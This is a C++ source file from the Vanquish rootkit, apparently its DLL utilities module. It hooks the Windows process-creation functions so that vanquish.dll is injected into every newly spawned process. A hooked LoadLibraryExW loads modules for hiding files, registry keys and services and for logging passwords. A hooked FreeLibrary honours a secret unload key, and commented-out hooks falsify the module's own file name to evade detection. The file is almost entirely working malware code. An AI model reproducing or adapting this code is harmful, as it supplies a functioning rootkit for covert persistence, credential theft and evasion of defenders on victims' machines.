/******************************************************************************\

	Vanquish DLL DllUtils - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vDllUtils.h"
#include "..\Injector.h"
#include "..\Utils.h"

#ifdef VANQUISH_HIDEFILES
#include "vHideFiles.h"
EXTERN_HIDEFILES
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
#include "vHideReg.h"
EXTERN_HIDEREG
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_HIDESERVICES
#include "vHideServices.h"
EXTERN_HIDESERVICES
#endif//VANQUISH_HIDESERVICES

#ifdef VANQUISH_PWDLOG
#include "vPwdLog.h"
EXTERN_PWDLOG
#endif//VANQUISH_PWDLOG

#ifdef VANQUISH_SOURCEPROTECT
#include "vSourceProtect.h"
EXTERN_SOURCEPROTECT
#endif//VANQUISH_SOURCEPROTECT

EXTERN_VANQUISH_MODULES
DECLARE_DLLUTILS

extern BOOL bUnloading; //in Vanquish_dll.cpp
extern HMODULE hVanquishModule; //in Vanquish_dll.cpp

//N.B: taskmgr.exe is created with a call to CreateProcessAsUserW from winlogon.exe
//     lpApplicationName is NULL
//     lpCommandLine is "taskmgr.exe"
//     lpProcessAttributes is NULL
//     lpThreadAttributes is NULL
//     bInheritHandles is FALSE
//     dwCreationFlags is CREATE_UNICODE_ENVIRONMENT | CREATE_SUSPENDED

//N.B: explorer usually runs a program with CreateProcessW
//     dwCreationFlags is CREATE_DEFAULT_ERROR_MODE | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE

//N.B: add/remove programs usually unistalls something with a call to CreateProcessW
//     dwCreationFlags is CREATE_SEPARATE_WOW_VDM | CREATE_SUSPENDED
//*** this was the reason for deadlocking: we were WaitForInputIdle(INFINITE) on a suspended thread!

NEWAPI
BOOL
WINAPI
VCreateProcessA(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    )
{
	BOOL retValue = FALSE;

	PROCESS_INFORMATION pi;
	LPPROCESS_INFORMATION lpOldProcessInformation = lpProcessInformation;
	DWORD dwOld = dwCreationFlags;

	//moZify needed params
	dwCreationFlags |= CREATE_SUSPENDED;
	lpProcessInformation = &pi;

	//first do the api thing
	RESTORE_API(CreateProcessA);
	OLDCALL(CreateProcessA, 10);
	REPLACE_API(CreateProcessA);

	//just in case...
	if (bUnloading == TRUE) return retValue;

	//then infect the new process
	if (retValue)
	{
		//update caller buffer with pi
		if (!IsBadWritePtr(lpOldProcessInformation, sizeof(PROCESS_INFORMATION)))
			VRTCopyMemory(lpOldProcessInformation, lpProcessInformation, sizeof(PROCESS_INFORMATION));
		//VRTWriteLog(FALSE, 0, NULL, "[NEW PROCESS]Injecting <vanquish.dll> into: [%s] Command: [%s]\r\n", lpApplicationName, lpCommandLine);
		if (!Vanquish_SafeInjectProcess(lpProcessInformation, ((dwOld & CREATE_SUSPENDED) == CREATE_SUSPENDED) ? 0 : VANQUISHINJECT_POSTRESUMETHREAD))
		{
			VRTWriteLog(FALSE, 0, NULL, "Failed to inject VANQUISH!\r\n"
				"hProcess: 0x%08x\r\n"
				"hThread: 0x%08x\r\n"
				"dwProcessId: 0x%08x\r\n"
				"dwThreadId: 0x%08x\r\n",
				(DWORD)lpProcessInformation->hProcess,
				(DWORD)lpProcessInformation->hThread,
				lpProcessInformation->dwProcessId,
				lpProcessInformation->dwThreadId
				);
		}
	}
	/*
	else
	{
		VRTWriteLog(FALSE, 0, NULL, "CreateProcessA: No retValue or ProcessInfo!!!\r\n");
	}
	*/

	return retValue;
}

NEWAPI
BOOL
WINAPI
VCreateProcessW(
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    )
{
	BOOL retValue = FALSE;

	PROCESS_INFORMATION pi;
	LPPROCESS_INFORMATION lpOldProcessInformation = lpProcessInformation;
	DWORD dwOld = dwCreationFlags;

	//moZify needed params
	dwCreationFlags |= CREATE_SUSPENDED;
 	lpProcessInformation = &pi;

	//first do the api thing
	RESTORE_API(CreateProcessW);
	OLDCALL(CreateProcessW, 10);
	REPLACE_API(CreateProcessW);

	//just in case...
	if (bUnloading == TRUE) return retValue;

	//then infect the new process
	if (retValue)
	{
		//update caller buffer with pi
		if (!IsBadWritePtr(lpOldProcessInformation, sizeof(PROCESS_INFORMATION)))
			VRTCopyMemory(lpOldProcessInformation, lpProcessInformation, sizeof(PROCESS_INFORMATION));
		//VRTWriteLog(FALSE, 0, NULL, "[NEW PROCESS]Injecting <vanquish.dll> into: [%S] Command: [%S]\r\n", lpApplicationName, lpCommandLine);
		if (!Vanquish_SafeInjectProcess(lpProcessInformation, ((dwOld & CREATE_SUSPENDED) == CREATE_SUSPENDED) ? 0 : VANQUISHINJECT_POSTRESUMETHREAD))
		{
			VRTWriteLog(FALSE, 0, NULL, "Failed to inject VANQUISH!\r\n"
				"hProcess: 0x%08x\r\n"
				"hThread: 0x%08x\r\n"
				"dwProcessId: 0x%08x\r\n"
				"dwThreadId: 0x%08x\r\n",
				(DWORD)lpProcessInformation->hProcess,
				(DWORD)lpProcessInformation->hThread,
				lpProcessInformation->dwProcessId,
				lpProcessInformation->dwThreadId
				);
		}
	}
	/*
	else
	{
		VRTWriteLog(FALSE, 0, NULL, "CreateProcessW: No retValue or ProcessInfo!!!\r\n");
	}
	*/

	return retValue;
}

NEWAPI
BOOL
WINAPI
VCreateProcessAsUserA(
    HANDLE hToken,
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory,
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    )
{
	BOOL retValue = FALSE;

	PROCESS_INFORMATION pi;
	LPPROCESS_INFORMATION lpOldProcessInformation = lpProcessInformation;
	DWORD dwOld = dwCreationFlags;

	//moZify needed params
	dwCreationFlags |= CREATE_SUSPENDED;
	lpProcessInformation = &pi;

	//first do the api thing
	RESTORE_API(CreateProcessAsUserA);
	OLDCALL(CreateProcessAsUserA, 11);
	REPLACE_API(CreateProcessAsUserA);

	//just in case...
	if (bUnloading == TRUE) return retValue;

	//then infect the new process
	if (retValue)
	{
		//update caller buffer with pi
		if (!IsBadWritePtr(lpOldProcessInformation, sizeof(PROCESS_INFORMATION)))
			VRTCopyMemory(lpOldProcessInformation, lpProcessInformation, sizeof(PROCESS_INFORMATION));
		//VRTWriteLog(FALSE, 0, NULL, "[NEW PROCESS]Injecting <vanquish.dll> into: [%s] Command: [%s]\r\n", lpApplicationName, lpCommandLine);
		if (!Vanquish_SafeInjectProcess(lpProcessInformation, ((dwOld & CREATE_SUSPENDED) == CREATE_SUSPENDED) ? 0 : VANQUISHINJECT_POSTRESUMETHREAD))
		{
			VRTWriteLog(FALSE, 0, NULL, "Failed to inject VANQUISH!\r\n"
				"hProcess: 0x%08x\r\n"
				"hThread: 0x%08x\r\n"
				"dwProcessId: 0x%08x\r\n"
				"dwThreadId: 0x%08x\r\n",
				(DWORD)lpProcessInformation->hProcess,
				(DWORD)lpProcessInformation->hThread,
				lpProcessInformation->dwProcessId,
				lpProcessInformation->dwThreadId
				);
		}
	}
	/*
	else
	{
		VRTWriteLog(FALSE, 0, NULL, "CreateProcessAsUserA: No retValue or ProcessInfo!!!\r\n");
	}
	*/

	return retValue;
}

NEWAPI
BOOL
WINAPI
VCreateProcessAsUserW(
    HANDLE hToken,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    )
{
	BOOL retValue = FALSE;

	PROCESS_INFORMATION pi;
	LPPROCESS_INFORMATION lpOldProcessInformation = lpProcessInformation;
	DWORD dwOld = dwCreationFlags;

	//moZify needed params
	dwCreationFlags |= CREATE_SUSPENDED;
	lpProcessInformation = &pi;

	//first do the api thing
	RESTORE_API(CreateProcessAsUserW);
	OLDCALL(CreateProcessAsUserW, 11);
	REPLACE_API(CreateProcessAsUserW);

	//just in case...
	if (bUnloading == TRUE) return retValue;

	//then infect the new process
	if (retValue)
	{
		//update caller buffer with pi
		if (!IsBadWritePtr(lpOldProcessInformation, sizeof(PROCESS_INFORMATION)))
			VRTCopyMemory(lpOldProcessInformation, lpProcessInformation, sizeof(PROCESS_INFORMATION));
		//VRTWriteLog(FALSE, 0, NULL, "[NEW PROCESS]Injecting <vanquish.dll> into: [%S] Command: [%S]\r\n", lpApplicationName, lpCommandLine);
		if (!Vanquish_SafeInjectProcess(lpProcessInformation, ((dwOld & CREATE_SUSPENDED) == CREATE_SUSPENDED) ? 0 : VANQUISHINJECT_POSTRESUMETHREAD))
		{
			VRTWriteLog(FALSE, 0, NULL, "Failed to inject VANQUISH!\r\n"
				"hProcess: 0x%08x\r\n"
				"hThread: 0x%08x\r\n"
				"dwProcessId: 0x%08x\r\n"
				"dwThreadId: 0x%08x\r\n",
				(DWORD)lpProcessInformation->hProcess,
				(DWORD)lpProcessInformation->hThread,
				lpProcessInformation->dwProcessId,
				lpProcessInformation->dwThreadId
				);
		}
	}
	/*
	else
	{
		VRTWriteLog(FALSE, 0, NULL, "CreateProcessAsUserW: No retValue or ProcessInfo!!!\r\n");
	}
	*/

	return retValue;
}

NEWAPI
HMODULE
WINAPI
VLoadLibraryExW(
    LPCWSTR lpLibFileName,
    HANDLE hFile,
    DWORD dwFlags
    )
{
	HMODULE retValue = NULL;

	RESTORE_API(LoadLibraryExW);
	OLDCALL(LoadLibraryExW, 3);
	REPLACE_API(LoadLibraryExW);

	//just in case...
	if (bUnloading == TRUE) return retValue;

	LOAD_VANQUISH_MODULES

#ifdef VANQUISH_DLLUTILS
	LOAD_VANQUISH(DLLUTILS);
#endif//VANQUISH_DLLUTILS

#ifdef VANQUISH_HIDEFILES
	LOAD_VANQUISH(HIDEFILES);
#endif//VANQUISH_HIDEFILES

#ifdef VANQUISH_HIDEREG
	LOAD_VANQUISH(HIDEREG);
#endif//VANQUISH_HIDEREG

#ifdef VANQUISH_HIDESERVICES
	LOAD_VANQUISH(HIDESERVICES);
#endif//VANQUISH_HIDESERVICES

#ifdef VANQUISH_PWDLOG
	LOAD_VANQUISH(PWDLOG);
#endif//VANQUISH_PWDLOG

#ifdef VANQUISH_SOURCEPROTECT
	LOAD_VANQUISH(SOURCEPROTECT);
#endif//VANQUISH_SOURCEPROTECT

	return retValue;
}

#pragma warning(disable: 4731)
NEWAPI
BOOL
WINAPI
VFreeLibrary(
    HMODULE hLibModule
    )
{
	BOOL retValue = FALSE;

	//if hLibModule is NOT vanquish THEN we must check if we should unload it...
	if ((DWORD)hLibModule != (DWORD)hVanquishModule)
	{
		//check for code
		if ((DWORD)hLibModule == VANQUISH_DLL_UNLOAD_KEY)
		{
			//MessageBox(NULL, "Unloading :) ...", "BAU!", MB_OK);
			bUnloading = TRUE;
			hLibModule = (HMODULE)hVanquishModule; //bye bye

			//VRTWriteLog(FALSE, 0, NULL, "Unloading Vanquish.\r\n");

			//we dont need a replace api because we won't exist anymore
			RESTORE_API(FreeLibrary);
			LASTCALL(FreeLibrary, 1);
			//MessageBox(NULL, "Shit! Shit!", "BAU!", MB_OK);
		}

		//do it
		RESTORE_API(FreeLibrary);
		OLDCALL(FreeLibrary, 1);
		REPLACE_API(FreeLibrary);
	}

	return retValue;
}
#pragma warning(default: 4731)

/*

NEWAPI
DWORD
WINAPI
VGetModuleFileNameA(
	HMODULE hModule,
	LPSTR lpFilename,
	DWORD nSize
	)
{
	DWORD retValue = 0;

	//do api thing
	RESTORE_API(GetModuleFileNameA);
	OLDCALL(GetModuleFileNameA, 3);
	REPLACE_API(GetModuleFileNameA);

	if (pos0(lpFilename) != MAXDWORD)
	{
		//cleanup any string
		if (!IsBadWritePtr(lpFilename, STR_SIZEA(nSize)))
			VRTFillMemory(lpFilename, STR_SIZEA(nSize), 0);

		//mozify with kernel32 path... :) lol
		hModule = MODULE(KERNEL32);
		RESTORE_API(GetModuleFileNameA);
		OLDCALL(GetModuleFileNameA, 3);
		REPLACE_API(GetModuleFileNameA);

		VRTWriteLog(FALSE, 0, NULL, "WARNING! This program tried to find out who we are!\r\nI told him that we are %s\r\n", lpFilename);
	}

	return retValue;
}

NEWAPI
DWORD
WINAPI
VGetModuleFileNameW(
	HMODULE hModule,
	LPWSTR lpFilename,
	DWORD nSize
	)
{
	DWORD retValue = 0;

	//do api thing
	RESTORE_API(GetModuleFileNameW);
	OLDCALL(GetModuleFileNameW, 3);
	REPLACE_API(GetModuleFileNameW);

	if (posw0(lpFilename) != MAXDWORD)
	{
		//cleanup any string
		if (!IsBadWritePtr(lpFilename, STR_SIZEW(nSize)))
			VRTFillMemory(lpFilename, STR_SIZEW(nSize), 0);

		//mozify with kernel32 path... :) lol
		hModule = MODULE(KERNEL32);
		RESTORE_API(GetModuleFileNameW);
		OLDCALL(GetModuleFileNameW, 3);
		REPLACE_API(GetModuleFileNameW);

		VRTWriteLog(FALSE, 0, NULL, "WARNING! This program tried to find out who we are!\r\nI told him wide that we are %S\r\n", lpFilename);
	}

	return retValue;
}
*/